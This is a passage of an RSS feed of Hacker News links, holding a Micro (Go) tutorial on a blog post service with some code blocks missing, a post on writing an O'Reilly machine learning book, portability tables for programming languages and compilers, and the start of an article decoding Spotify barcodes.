            <time datetime="2020-11-16">16 Nov 2020</time>
            
        </span> -->

        <!-- <h1 class="post-title">Building a blog with Micro in Go</h1> -->

        <section>
            <p><em>This is a cross post from <a href="https://micro.mu.blog/">micro.mu/blog</a> on how to build a blog with Micro. 
We’ve been getting a lot of feedback on our series related to Netlify for the backend and what’s clear, 
people want to see more code. So here it is. Hope you enjoy!</em></p>

<p>This series will cover how to build a blog service using Micro. We’ll decompose a monolithic Blog into multiple services. 
In part one we’ll focus on building a Post service. It will be good way to learn how to build nontrivial applications with 
the <a href="https://micro.mu/reference#store">store</a> and the <a href="https://github.com/micro/dev/tree/master/model">model</a>.</p>

<p>The most important takeaway from this post will likely be the the usage of the key-value store for non-trivial usecases 
(such as querying blog posts by slug and listing them by reverse creation order).</p>

<h2 id="the-basics">The Basics</h2>

<p>Head to the <a href="https://micro.mu/getting-started">Getting Started Guide</a> if you haven’t used Micro before.</p>

<p>If you have let’s use that knowledge! As a reminder, we have to make sure <code>micro server</code> is running in an other terminal, 
and we are connected to it, ie</p>

<p>Running the micro server</p>



<p>Looking up our local environment</p>

<div><div><pre><code><span>$ </span>micro <span>env</span>
<span>*</span> <span>local      </span>127.0.0.1:8081         Local running micro server
  dev        proxy.m3o.dev          Cloud hosted development environment
  platform   proxy.m3o.com          Cloud hosted production environment
</code></pre></div></div>

<p>We can see the local environment picked. If not, we can issue <code>micro env set local</code> to remedy.</p>

<p>Now back to the <code>micro new</code> command:</p>

<div><div><pre><code><span>$ </span>micro new posts
<span>$ </span><span>ls </span>posts
Dockerfile	Makefile	README.md	generate.go	go.mod		handler		main.go		proto
</code></pre></div></div>

<p>Great! The best way to start a service is to define the proto. The generated default should be something similar to this:</p>

<p>In our post service, we want 3 methods:</p>
<ul>
  <li><code>Save</code> for blog insert and update</li>
  <li><code>Query</code> for reading and listing</li>
  <li><code>Delete</code> for deletion</li>
</ul>

<p>Let’s start with the post method.</p>



<p>Astute readers might notice that although we have defined a <code>Post</code> message type, we still redefine some of the fields as top level fields for the <code>SaveRequest</code> message type.
The main reason for this is that we don’t want our <a href="https://micro.mu/reference#dynamic-commands">dynamic commands</a>.</p>

<p>Ie. if we would embed a <code>Post post = 1</code> inside <code>SaveRequest</code>, we would call the posts service the following way:</p>

<div><div><pre><code>micro posts save <span>--post_title</span><span>=</span>Title <span>--post_content</span><span>=</span>Content
</code></pre></div></div>

<p>but we don’t want to keep repeating <code>post</code>, our preferred way is:</p>

<div><div><pre><code>micro posts save <span>--title</span><span>=</span>Title <span>--content</span><span>=</span>Content
</code></pre></div></div>

<p>To regenerate the proto, we have to issue the <code>make proto</code> command in the project root.</p>

<p>Now, the <code>main.go</code>:</p>



<p>After that’s done, let’s adjust the handler to match our proto! This snippet is a bit longer, so cover it piece by piece:</p>



<p>The above piece of code uses the <a href="https://github.com/micro/dev/tree/master/model">model package</a>. It sets up the indexes which will enable us to query the data and also tells model to maintain these indexes.</p>

<ul>
  <li>The id index is needed to read by id</li>
  <li>The created index is needed so when we list posts the order of the posts will be descending based on the created field</li>
  <li>The slug index is needed to we can read posts by slug (ie. <code>myblog.com/post/awesome-post-url</code>)</li>
</ul>

<p>At this point <code>micro run .</code> in project root should deploy our post service. Let’s verify with <code>micro logs posts</code>:</p>

<div><div><pre><code>$ micro logs posts
Starting [service] posts
Server [grpc] Listening on [::]:53031
Registry [service] Registering node: posts-b36361ae-f2ae-48b0-add5-a8d4797508be
</code></pre></div></div>

<p>(The exact output might depend on the actual config format configuraton.)</p>

<h2 id="saving-posts">Saving posts</h2>

<p>Let’s make our service do something useful now: save a post.</p>



<p>After a <code>micro update .</code> in project root, we can start saving posts!</p>

<div><div><pre><code>micro posts save --id=1 --title="Post one" --content="First saved post"
micro posts save --id=2 --title="Post two" --content="Second saved post"
</code></pre></div></div>

<h2 id="querying-posts">Querying posts</h2>

<p>Again, implementation starts with defining the protos:</p>



<p>A <code>make proto</code> issued in the command root should regenerate the Go proto files and we should be ready to define our new handler:</p>

<p>We want our query handler to enable querying by id, slug and also enable listing of posts:</p>



<p>As mentioned, the existing indexes can be used for querying too with the <code>ToQuery</code> method.</p>

<p>After doing a <code>micro update .</code> in the project root, we can now query the posts:</p>

<div><div><pre><code>$ micro posts query
{
	"posts": [
		{
			"id": "2",
			"title": "Post two",
			"slug": "post-two",
			"content": "Second saved post",
			"created": "1604423363"
		},
		{
			"id": "1",
			"title": "Post one",
			"slug": "post-one",
			"content": "First saved post",
			"created": "1604423297"
		}
	]
}

</code></pre></div></div>

<p>Stellar! Now only <code>Delete</code> remains to be implemented to have a basic post service.</p>

<h2 id="deleting-posts">Deleting posts</h2>

<p>Since we have already defined <code>Delete</code> in our proto, we only have to implement the handler. It is rather simple:</p>



<h2 id="conclusions">Conclusions</h2>

<p>This brings us to the end of the first post in the blogs tutorial series.
There are many more features we will add later, like saving and querying by tags, but this post already taught us enough to digest.
We will cover those aspect in later parts of this series.</p>

<p>The source code for this can be found <a href="https://github.com/micro/dev/tree/master/blog/v1-posts">here</a>.
Further versions will be in the same <code>blog</code> folder with different versions, ie <code>v2-posts</code> and once we have more services, <code>v2-tags</code>, <code>v2-comments</code>.
Folders with the same prefix will be meant to be deployed together, but more on this later.</p>


        </section>

        

        

    </article>

</div></div>]]>
            </description>
            <link>https://blog.m3o.com/2020/11/16/building-a-blog-with-micro.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25138273</guid>
            <pubDate>Wed, 18 Nov 2020 15:59:30 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Writing a technical book: from idea to print]]>
            </title>
            <description>
<![CDATA[
Score 177 | Comments 34 (<a href="https://news.ycombinator.com/item?id=25138216">thread link</a>) | @sararob
<br/>
November 18, 2020 | https://sararobinson.dev/2020/11/17/writing-a-technical-book.html | <a href="https://web.archive.org/web/*/https://sararobinson.dev/2020/11/17/writing-a-technical-book.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
	  <p><strong>tl;dr</strong> - I co-authored an O’Reilly book with my colleagues <a href="https://twitter.com/lak_gcp" target="_blank">Lak</a> and <a href="https://www.linkedin.com/in/munnm/" target="_blank">Mike</a>! You can <a href="https://www.oreilly.com/library/view/machine-learning-design/9781098115777/" target="_blank">order it here</a> and 100% of the royalties go to <a href="https://girlswhocode.com/" target="_blank">Girls Who Code</a>. This post is about the writing process.</p>

<h3 id="deciding-to-write">Deciding to write</h3>

<p>Back in January of this year, Lak graciously reached out to me asking if I was interested in co-writing an O’Reilly book on machine learning. As I read the email, my reaction was almost an immediate no because:</p>

<ul>
  <li>It sounded like something that would take a lot of time.</li>
  <li>With a quickly evolving field like ML, wouldn’t a book be obsolete before it hit the shelves?</li>
</ul>

<p>I let Lak’s request sit in my inbox for a few days even though I was sure I had made up my mind, because saying no to projects is much harder than saying yes. A few days later on a long car ride with my fiancé, I mentioned the book offer in passing.</p>

<blockquote>
  <p>“You have an opportunity to write a book and you’re saying <em>no</em>?” he said, nearly pulling off the road.</p>
</blockquote>

<p>I suppose I had considered this offer as more of a <strong>burden</strong>, but from his perspective it was an <strong>opportunity</strong>. Ok, he wouldn’t be the one writing it, but he has <a href="https://www.amazon.com/Building-Embedded-Linux-Systems-Techniques-dp-0596529686/dp/0596529686" target="_blank">written</a> an O’Reilly book before!</p>

<p>It would no doubt be hard, but it also provided a chance to learn a lot along the way and have a book at the end of it. With his advice in mind, I decided to learn more about the book before saying no. The plan for the book was to catalog a series of patterns, each of which would outline a common challenge in ML and provide some approaches for solving it. I was intrigued, but some doubts started to creep in as I read through the pattern ideas:</p>

<ul>
  <li>
    <p>I was very familiar with some, but much less so with others. Didn’t I need to have all this knowledge in my head before writing for this to work?</p>
  </li>
  <li>
    <p>Why me? Why was I qualified to do this? Objectively, I have created a lot of ML content over the years to educate app developers, data scientists, and customers. I’d like to think I’m a decent writer, but a book? That seemed like a different beast, and I wasn’t sure I was the best person for the job.</p>
  </li>
</ul>

<p>There can always be a million reasons not to do something, but I ultimately decided to ignore them all and give it a try.</p>

<h3 id="starting-with-an-idea">Starting with an idea</h3>

<p>This happened before I joined the project, so I asked Lak what he did before reaching out to O’Reilly with the idea for the book. Publishers get cold proposals all the time, so it helps if you can clearly communicate what the book will be about and show that you know what you will be writing about.</p>

<p>In our case, Lak wrote a couple of blog posts on machine learning design patterns (<a href="https://medium.com/swlh/ml-design-pattern-1-transform-9e82ccbc3209">Transform</a> and <a href="https://towardsdatascience.com/ml-design-pattern-2-checkpoints-e6ca25a4c5fe">Checkpoints</a>) to gauge whether readers were interested in this idea. They were, but he realized that readers’ interest was very much in how to implement, adapt, and extend these patterns. He also did a talk on the topic at a couple of conferences and discovered that conference attendees were a bit different – they needed a clear explanation of the reason to use the pattern and a prescriptive approach to addressing the problem. In other words, readers who knew the pattern beforehand wanted a technical manual, while conference attendees (who were being introduced to the pattern for the first time) wanted to know why the pattern matters. This helped him write the next set of blog posts, where he started with a crisp problem statement, a canonical solution, and a couple of variations.</p>

<p>Once he had a good idea of how to communicate ML design patterns, Lak reached out to an O’Reilly editor with a short message:</p>

<blockquote>
  <p>I have a <a href="https://link.medium.com/7BSgxXdts1">list</a> of about 20 machine learning design patterns that I want to write about. Do you think they would do well as a book? If so, I can see about finding a co-author who would be interested in expanding on these…</p>
</blockquote>

<p>The editor replied that since O’Reilly has a solid franchise in design patterns, he was very interested. He was assigned an acquisitions editor who would work with us to craft the actual proposal. And that’s when Lak reached out to me to see if I was interested in co-authoring.</p>

<h3 id="building-an-outline">Building an outline</h3>

<p>I knew nothing about writing a book going into this, and my first question was: how will we split up the work? Will we alternate paragraphs, sections, chapters, words? I’m sure this varies for every book with multiple authors. We decided to split work by sections. In our case, each section was a design pattern and each chapter had 3-6 patterns. We started by making an outline, with an initial list of 20 patterns.</p>

<p>Chapters in our book are organized by different phases in a typical machine learning workflow. We first determined the topic for each chapter, and then came up with the patterns we wanted to be included in it. In the outline, each pattern had a 1-2 sentence description. It took a few iterations of adding and removing patterns and moving some between chapters before we had something we were happy with. We finished this process with a total of 30 patterns split across 6 chapters, with 2 additional chapters for an intro and conclusion. This brought us to the end of February.</p>

<h3 id="submitting-a-book-proposal">Submitting a book proposal</h3>

<p>The first step in the publishing process for many books is writing a proposal and submitting it to an acquisitions editor. Acquisitions editors are in charge of reviewing proposals, providing feedback, and deciding whether a proposal will move to the next stage in the approval process. They also work on overall content strategy, deciding which topics they want to cover. Sometimes people reach out to them cold, and other times these editors may proactively reach out to prospective authors.</p>

<p>The proposal (which includes the outline, but also comparisons with existing titles, and who the intended audience is) went through a few rounds of feedback (which is where I joined the process), including detailed technical feedback, before getting approved. The acquisitions editor focuses on acquiring new content, so once ours got approved we moved to the next step in the process which was working with a development editor. This person was our main point of contact throughout the writing process – more on that in the next section.</p>

<p>I recently had a great conversation with our acquisitions editor, where I learned a lot more about the publishing industry and how this all works. One thing from this conversation especially stood out: she mentioned she <em>rarely</em> receives a cold book proposal from a woman, and she gets many cold proposals each day. I’m sharing this data (with her permission) in hopes that it encourages more women with book ideas to just go for it. Reach out! You’ve got nothing to lose. If your proposal gets rejected, you’ll likely still get some feedback in the process.</p>

<h3 id="writing-time">Writing time</h3>

<p>I assumed we’d begin at the beginning, but we started by writing Chapter 2. Chapter 1 didn’t have any patterns – it was meant to be an overview of the entire book, explain our goals, and set the stage for the intended audience. Without anything written yet this would be hard to write, so we got right into patterns by starting with Chapter 2. Before sitting down to write this chapter, we took our short Chapter 2 outline and worked together to expand it. This is something we did before every chapter, with the goals of:</p>

<ul>
  <li>Ensuring the three of us had the same understanding of each pattern</li>
  <li>Agreeing on what should and shouldn’t be covered</li>
  <li>Splitting up the writing by pattern</li>
</ul>

<p>Early on in the outline process, we had decided each pattern should follow the same structure. If you’re reading the book, you’ll notice that every pattern is split into the following:</p>

<ul>
  <li><strong>Problem</strong>: describes the ML challenge a pattern addresses</li>
  <li><strong>Solution</strong>: describes one approach to solving the problem, including code snippets and recommended tooling for solving the problem</li>
  <li><strong>Tradeoffs and Alternatives</strong>: extended discussion on the pattern, including tools not covered in the Solution section, potential gotchas, and related solutions</li>
</ul>

<p>Having a structure for each section was extremely useful in ensuring consistency throughout the book.</p>

<p>After outlining Chapter 2 in detail, I had two patterns assigned to me and it was finally time to write. I wish I could tell you this is the part where I sat down at my desk, closed the door, and let the insights flow onto the page. This is how I’d always imagined book writing went. For better or worse (and maybe because the outside world went into chaos while this was happening), my process went more like this:</p>

<blockquote><div lang="en" dir="ltr"><p>My writing process:</p><p>* Write 2 sentences<br>* My glasses are splotchy, where are the lens wipes?<br>* Edit the last sentence I wrote<br>* Research the latest keyboards<br>* Write another 2 sentences<br>* Refill water, clean the counter<br>* Stare at my now perfect paragraph<br>* Open Twitter</p></div>— Sara Robinson (@SRobTweets) <a href="https://twitter.com/SRobTweets/status/1244312122613473281?ref_src=twsrc%5Etfw">March 29, 2020</a></blockquote>


<p>It wasn’t a very efficient way to start, but it got the job done and over time my process improved. I also quickly debunked my initial question:</p>

<p><em>Didn’t I need to have all this knowledge in my head before writing for this to work?</em></p>

<p>Even if I did have experience implementing a particular pattern, I couldn’t write only what I already knew. I had to do a considerable amount of research before I started writing the bulk of each pattern to find out:</p>

<ul>
  <li>What writing on this topic already existed?</li>
  <li>Are there any important research papers that cover this?</li>
  <li>What tools are available for solving this pattern?</li>
</ul>

<p>With all this research I started to have some doubts. If I was just collating information from various sources, was I providing anything useful? Then I thought about some of my favorite non-fiction books and realized most of them work by:</p>

<p><em>Presenting existing, relevant information + adding a unique angle</em></p>

<p>I’ve met with a lot of customers and seen production use of ML, and I’ve also built demos to help developers understand how to use different ML tools. Turns out I did have a unique angle! Before writing I did a lot of reading to make sure I fully understood the ins and outs of the pattern. Then I had enough information to write. I still wouldn’t say the words flowed at this point, but I did slowly get …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://sararobinson.dev/2020/11/17/writing-a-technical-book.html">https://sararobinson.dev/2020/11/17/writing-a-technical-book.html</a></em></p>]]>
            </description>
            <link>https://sararobinson.dev/2020/11/17/writing-a-technical-book.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25138216</guid>
            <pubDate>Wed, 18 Nov 2020 15:56:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Programming Language Fragility]]>
            </title>
            <description>
<![CDATA[
Score 30 | Comments 30 (<a href="https://news.ycombinator.com/item?id=25138125">thread link</a>) | @da_big_ghey
<br/>
November 18, 2020 | https://cancel.fm/blog/2019-11/language-fragility/ | <a href="https://web.archive.org/web/*/https://cancel.fm/blog/2019-11/language-fragility/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><main><dl><dt>Published</dt><dd><time datetime="2019-11-02T00:00:00Z">2019-11-02</time></dd><dt>Last updated</dt><dd>2019-11-02 16:28 UTC</dd></dl><section><p>Suggestions and corrections: <a href="mailto:cancel@cancel.fm">cancel@cancel.fm</a></p><hr><p>How fragile are the products of programming languages? If you write some software in a particular language, can you copy the compiled program to another computer and expect it to work? If the internet stopped functioning, would you be left helpless?</p><table><thead><tr><th>Language</th><th>Portable by Default</th><th>Portable with Effort</th><th>Notes</th></tr></thead><tbody><tr><td>C</td><td>No (libc)</td><td>OK</td><td></td></tr><tr><td>C++</td><td>No (libc)</td><td>OK</td><td></td></tr><tr><td>Rust</td><td>No (libc)</td><td>OK</td><td>Requires no_std. Most of the Rust ecosystem will be unusable.</td></tr><tr><td>Go</td><td>OK</td><td>OK</td><td></td></tr><tr><td>Pascal (fpc &amp; Delphi)</td><td>OK</td><td>OK</td><td></td></tr><tr><td>Zig</td><td>OK</td><td>OK</td><td></td></tr><tr><td>Nim</td><td>OK</td><td>OK</td><td></td></tr><tr><td>Odin</td><td>No (libc)</td><td>OK</td><td></td></tr><tr><td>D</td><td>No (libc)</td><td>No (libc)</td><td>Must use glibc on on Linux, and glibc cannot be statically linked.</td></tr><tr><td>Haskell</td><td>No (libc)</td><td>Partial (static libc)</td><td>Complex build process to statically link runtime libc. Must avoid using libgmp features.</td></tr><tr><td>OCaml</td><td>No (libc)</td><td>Partial (static libc)</td><td>Complex build process to statically link runtime libc. Win32 requires cygwin.</td></tr><tr><td>Swift</td><td>No (no Win32)</td><td>No (no Win32)</td><td></td></tr><tr><td>Java</td><td>No (complex runtime)</td><td>No (fragile bundling)</td><td>Complex and fragile bundling of a separate runtime (with licensing issues)</td></tr><tr><td>C#/F#/.NET</td><td>No (complex runtime)</td><td>No (fragile bundling)</td><td>Complex and fragile bundling of a separate runtime (with licensing issues)</td></tr><tr><td>Python</td><td>No (complex runtime)</td><td>No (fragile bundling)</td><td>Complex and fragile bundling of a separate runtime</td></tr><tr><td>Ruby</td><td>No (complex runtime)</td><td>No (fragile bundling)</td><td>Complex and fragile bundling of a separate runtime</td></tr><tr><td>Perl</td><td>No (complex runtime)</td><td>No (fragile bundling)</td><td>Complex and fragile bundling of a separate runtime</td></tr><tr><td>JavaScript (Node.js)</td><td>No (complex runtime)</td><td>No (fragile bundling)</td><td>Complex and fragile bundling of a separate runtime</td></tr><tr><td>Scheme (Racket)</td><td>No (complex runtime)</td><td>No (fragile bundling)</td><td>Complex and fragile bundling of a separate runtime (with licensing issues)</td></tr><tr><td>Lua</td><td>No (custom binary)</td><td>Partial (custom binary)</td><td>Must build custom binary of the runtime plus your program code bundled together.</td></tr><tr><td>Tcl</td><td>No (complex runtime)</td><td>Partial (custom binary)</td><td>Must build custom binary of the runtime plus your program code bundled together.</td></tr></tbody></table><hr><p>What about the compilers themselves? How likely is something to go wrong when acquiring or setting up a compiler?</p><table><thead><tr><th>Compiler/Interpreter</th><th>Portable</th><th>Notes</th></tr></thead><tbody><tr><td>gcc</td><td>No</td><td>Requires installer or package manager. Heavy environment entanglement. Multiple executables.</td></tr><tr><td>clang</td><td>No</td><td>Requires installer or package manager. Heavy environment entanglement. Multiple executables.</td></tr><tr><td>msvc</td><td>No</td><td>Requires installer. Heavy environment entanglement. Multiple executables.</td></tr><tr><td>tcc</td><td>OK</td><td></td></tr><tr><td>Rust</td><td>No</td><td>Requires installer or package manager. Recommended installation method is to pipe curl into bash.</td></tr><tr><td>Go</td><td>OK</td><td></td></tr><tr><td>Free Pascal</td><td>No</td><td>Requires installer or package manager.</td></tr><tr><td>Delphi</td><td>No</td><td>Requires installer.</td></tr><tr><td>Zig</td><td>OK</td><td></td></tr><tr><td>Nim</td><td>No</td><td>Requires a C compiler.</td></tr><tr><td>Odin</td><td>OK</td><td></td></tr><tr><td>D</td><td>Partial</td><td>Multiple executables. Some environment entanglement. No installer required.</td></tr><tr><td>Haskell</td><td>No</td><td>Requires installer or package manager.</td></tr><tr><td>OCaml</td><td>No</td><td>Requires installer or package manager. Requires cygwin on Win32.</td></tr><tr><td>Swift</td><td>No</td><td>Requires installer. Heavy environment entanglement. Mac only.</td></tr><tr><td>Java</td><td>No</td><td>Requires installer or package manager. Multiple executables. Licensing issues.</td></tr><tr><td>C#/F#/.NET</td><td>No</td><td>Requires installer or package manager. Multiple executables. (Mono, .NET, and .NET Core)</td></tr><tr><td>Python</td><td>No</td><td>Requires installer or package manager. Heavy environment entanglement. Multiple executables.</td></tr><tr><td>Ruby</td><td>No</td><td>Requires installer or package manager.</td></tr><tr><td>Perl</td><td>No</td><td>Requires installer or package manager. Heavy environment entanglement.</td></tr><tr><td>JavaScript (Node.js)</td><td>No</td><td>Requires installer or package manager.</td></tr><tr><td>Scheme (Racket)</td><td>No</td><td>Requires installer or package manager.</td></tr><tr><td>Lua</td><td>OK</td><td>Rolling your own host executable is required.</td></tr><tr><td>Tcl</td><td>OK</td><td>Fully portable via tclkits/all-in-one binaries.</td></tr></tbody></table><hr><p>Bonus round: portable compilers that can build themselves, portably.</p><table><thead><tr><th>Compiler/Interpreter</th><th>Builds Itself Portably</th><th>Notes</th></tr></thead><tbody><tr><td>tcc</td><td>OK</td><td>When using musl-libc. No Win32.</td></tr><tr><td>Go</td><td>OK</td><td></td></tr><tr><td>Everything else</td><td>No</td><td></td></tr></tbody></table><hr><p><span>P.S.</span> I’ve been working on some indie shareware: if you use Slack but don’t like the default browser-based client, give Ripcord a try.</p><a href="https://cancel.fm/ripcord/"><div><dl><dt>Ripcord</dt><dd>Cross-platform, not-a-web-browser desktop chat client for Slack (and Discord.)</dd></dl><p><img src="https://cancel.fm/ripcord/static/ripcord_screenshot_win_7_small.jpg" height="75px" alt="Screenshot of the main Ripcord window with light theme"></p></div></a></section></main></div></div>]]>
            </description>
            <link>https://cancel.fm/blog/2019-11/language-fragility/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25138125</guid>
            <pubDate>Wed, 18 Nov 2020 15:50:26 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How Spotify Codes Work]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25138041">thread link</a>) | @whack
<br/>
November 18, 2020 | https://boonepeter.github.io/posts/2020-11-10-spotify-codes/ | <a href="https://web.archive.org/web/*/https://boonepeter.github.io/posts/2020-11-10-spotify-codes/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><article><div><p><img src="https://boonepeter.github.io/imgs/spotify/spotify_track_6vQN2a9QSgWcm74KEZYfDL.jpg" alt="Spotify barcode"></p><p><a href="https://www.spotifycodes.com/">Spotify Codes</a> are QR-like codes that can be generated to easily share Spotify songs, artists, playlists, and users. I set out to figure out how they worked, which lead me on a winding journey through barcode history, patents, packet sniffing, error correction, and Gray tables.</p><h2 id="spotify-uris">Spotify URIs</h2><p>Let’s start with Spotify URIs (Uniform Resource Identifiers). Different pieces of media (artists, albums, songs, playlists, users) all have a URI.</p><p>The ABBA song “Take a Chance on Me” has this URI:</p><p><code>spotify:track:6vQN2a9QSgWcm74KEZYfDL</code>.</p><p>The ABBA Album “The Album” has the following URI:</p><p><code>spotify:album:5GwbPSgiTECzQiE6u7s0ZN</code></p><p>As you can see, the URIs can be broken up into components:</p><p><code>spotify:&lt;media type&gt;:&lt;22 characters&gt;</code>.</p><p>The 22 characters are the numbers 0-9, characters a-z and A-Z. This means there are <code>10 + 26 + 26 = 62</code> possibilities for each character (almost <a href="https://en.wikipedia.org/wiki/Base64">Base64</a>). So the potential number of Spotify URIs is <code>62^22</code> which is equal to <code>2.7e39</code> or</p><div><pre><code data-lang="python"><span>2</span>,<span>707</span>,<span>803</span>,<span>647</span>,<span>802</span>,<span>660</span>,<span>400</span>,<span>290</span>,<span>261</span>,<span>537</span>,<span>185</span>,<span>326</span>,<span>956</span>,<span>544</span>
</code></pre></div><p>To illustrate that number:</p><div><pre><code data-lang="python">x <span>=</span> <span>62</span> <span>**</span> <span>22</span>
<span># the number of milliseconds in a year</span>
x <span>//=</span> <span>365</span> <span>*</span> <span>24</span> <span>*</span> <span>60</span> <span>*</span> <span>60</span> <span>*</span> <span>1000</span>
<span># the number of words in the bible (about 1 million)</span>
x <span>//=</span> <span>1000000</span>
</code></pre></div><p>If Spotify printed a whole Bible’s worth of URIs every millisecond they could do this for <code>85,863,890,404,701,306,452,633</code> years. Safe to say Spotify is not going to run out of URIs anytime soon.</p><h2 id="barcode-background">Barcode background</h2><p>The <a href="https://en.wikipedia.org/wiki/Barcode">history of barcodes</a> is quite extensive. Information is encoded into different barcodes in a variety of ways.</p><p>A lot of barcodes encode data in the <strong>widths</strong> of vertical bars. Universal product codes (UPCs) encode 12 digits using combinations of vertical bars of different widths:</p><p><img src="https://boonepeter.github.io/imgs/spotify/upc.png" alt="UPC encodings"></p><p><a href="https://en.wikipedia.org/wiki/KarTrak">Another barcode</a> uses colors to encode data:</p><p><img src="https://boonepeter.github.io/imgs/spotify/KarTrak_ACI_codes.svg.png" alt="Kartrack barcode"></p><p><a href="https://en.wikipedia.org/wiki/QR_code">QR codes</a> use a 2d matrix of dots to encode data.</p><p><img src="https://boonepeter.github.io/imgs/spotify/qr_code.png" alt="QR code"></p><p>A lot of mail barcodes encode data using the <strong>height</strong> of the bars (like the <a href="https://en.wikipedia.org/wiki/Intelligent_Mail_barcode">Intelligent Mail barcode</a>).</p><p><img src="https://boonepeter.github.io/imgs/spotify/intelligent_mail_barcode.png" alt="Intelligent mail barcode"></p><h2 id="spotify-codes">Spotify Codes</h2><p>Spotify codes work like the <a href="https://en.wikipedia.org/wiki/Intelligent_Mail_barcode">Intelligent Mail Barcode</a>. Information can be stored in the bars by setting them to different heights.</p><p>This is the Spotify code for the ABBA song “Take a Chance on Me”:</p><p><img src="https://boonepeter.github.io/imgs/spotify/spotify_track_6vQN2a9QSgWcm74KEZYfDL.jpg" alt="Spotify barcode"></p><p>When the bars are sorted by height you can see that there are 8 discrete heights that they fall into.</p><p><img src="https://boonepeter.github.io/imgs/spotify/sorted.png" alt="Spotify sorted barcodes"></p><p>This means the data is encoded in <a href="https://en.wikipedia.org/wiki/Octal">octal</a>.</p><p>The Spotify logo’s diameter is the same as the height of the highest bar. This makes it easy to generate ratios of the bars' heights.</p><p>In this function I use <a href="https://scikit-image.org/">scikit-image</a> to calculate the sequence of bar heights from a logo.</p><div><pre><code data-lang="python"><span>from</span> skimage <span>import</span> io
<span>from</span> skimage.measure <span>import</span> label, regionprops
<span>from</span> skimage.filters <span>import</span> threshold_otsu
<span>from</span> skimage.color <span>import</span> rgb2gray


<span>def</span> <span>get_heights</span>(filename: str) <span>-&gt;</span> list:
    <span>"""Open an image and return a list of the bar heights.
</span><span>    """</span>
    <span># convert to grayscale, then binary</span>
    image <span>=</span> io<span>.</span>imread(filename)
    im <span>=</span> rgb2gray(image)
    binary_im <span>=</span> im <span>&gt;</span> threshold_otsu(im)

    <span># label connected regions as objects</span>
    labeled <span>=</span> label(binary_im)

    <span># get the dimensions and positions of bounding box around objects</span>
    bar_dimensions <span>=</span> [r<span>.</span>bbox <span>for</span> r <span>in</span> regionprops(labeled)]

    <span># sort by X</span>
    bar_dimensions<span>.</span>sort(key<span>=</span><span>lambda</span> x: x[<span>1</span>], reverse<span>=</span>False)

    <span># the first object (spotify logo) is the max height of the bars</span>
    logo <span>=</span> bar_dimensions[<span>0</span>]
    max_height <span>=</span> logo[<span>2</span>] <span>-</span> logo[<span>0</span>]
    sequence <span>=</span> []
    <span>for</span> bar <span>in</span> bar_dimensions[<span>1</span>:]:
        height <span>=</span> bar[<span>2</span>] <span>-</span> bar[<span>0</span>]
        ratio <span>=</span> height <span>/</span> max_height
        <span># multiply by 8 to get an octal integer</span>
        ratio <span>*=</span> <span>8</span>
        ratio <span>//=</span> <span>1</span>
        <span># convert to integer (and make 0 based)</span>
        sequence<span>.</span>append(int(ratio <span>-</span> <span>1</span>))
    <span>return</span> sequence
</code></pre></div><p>This is the sequence of the “Take On Me” Spotify code:</p><div><pre><code data-lang="python"><span>&gt;&gt;&gt;</span> get_heights(<span>"/imgs/spotify/spotify_track_6vQN2a9QSgWcm74KEZYfDL.jpg"</span>)
[<span>0</span>, <span>5</span>, <span>1</span>, <span>2</span>, <span>0</span>, <span>6</span>, <span>4</span>, <span>3</span>, <span>7</span>, <span>1</span>, <span>6</span>, <span>7</span>, <span>7</span>, <span>7</span>, <span>7</span>, <span>3</span>, <span>1</span>, <span>6</span>, <span>3</span>, <span>7</span>, <span>0</span>, <span>7</span>, <span>0</span>]
</code></pre></div><p>Here are those results overlaid on the barcode:</p><p><img src="https://boonepeter.github.io/imgs/spotify/spotify_labeled.png" alt="labeled spotify code"></p><p>After looking at a few barcodes, I realized that the first and last bars are always 0, and the 12th bar is always a 7. This must help in identifying if the barcode is valid. Having the 12th bar as the max height also helps you calculate the ratios of the bar heights. I suspect setting the first and last bar set to 0 is an aesthetic choice: it makes the barcode look more like a sound wave. Here are a few barcodes printed out so you can see that the first and last are always equal to 0 and the 12th is equal to 7.</p><div><pre><code data-lang="python">    [<span>0</span>, <span>3</span>, <span>3</span>, <span>0</span>, <span>5</span>, <span>2</span>, <span>2</span>, <span>2</span>, <span>2</span>, <span>5</span>, <span>1</span>, <span>7</span>, <span>0</span>, <span>0</span>, <span>5</span>, <span>6</span>, <span>0</span>, <span>7</span>, <span>7</span>, <span>7</span>, <span>1</span>, <span>5</span>, <span>0</span>]
    [<span>0</span>, <span>5</span>, <span>6</span>, <span>5</span>, <span>3</span>, <span>5</span>, <span>4</span>, <span>2</span>, <span>7</span>, <span>2</span>, <span>5</span>, <span>7</span>, <span>1</span>, <span>3</span>, <span>1</span>, <span>1</span>, <span>6</span>, <span>1</span>, <span>1</span>, <span>6</span>, <span>7</span>, <span>6</span>, <span>0</span>]
    [<span>0</span>, <span>4</span>, <span>6</span>, <span>6</span>, <span>6</span>, <span>4</span>, <span>4</span>, <span>1</span>, <span>6</span>, <span>6</span>, <span>6</span>, <span>7</span>, <span>7</span>, <span>3</span>, <span>6</span>, <span>0</span>, <span>7</span>, <span>6</span>, <span>0</span>, <span>2</span>, <span>1</span>, <span>7</span>, <span>0</span>]
    [<span>0</span>, <span>0</span>, <span>3</span>, <span>3</span>, <span>7</span>, <span>5</span>, <span>2</span>, <span>3</span>, <span>1</span>, <span>1</span>, <span>4</span>, <span>7</span>, <span>5</span>, <span>5</span>, <span>5</span>, <span>3</span>, <span>3</span>, <span>7</span>, <span>5</span>, <span>1</span>, <span>4</span>, <span>3</span>, <span>0</span>]
    [<span>0</span>, <span>6</span>, <span>2</span>, <span>2</span>, <span>1</span>, <span>5</span>, <span>2</span>, <span>6</span>, <span>2</span>, <span>2</span>, <span>3</span>, <span>7</span>, <span>7</span>, <span>6</span>, <span>6</span>, <span>4</span>, <span>5</span>, <span>6</span>, <span>0</span>, <span>1</span>, <span>4</span>, <span>3</span>, <span>0</span>]
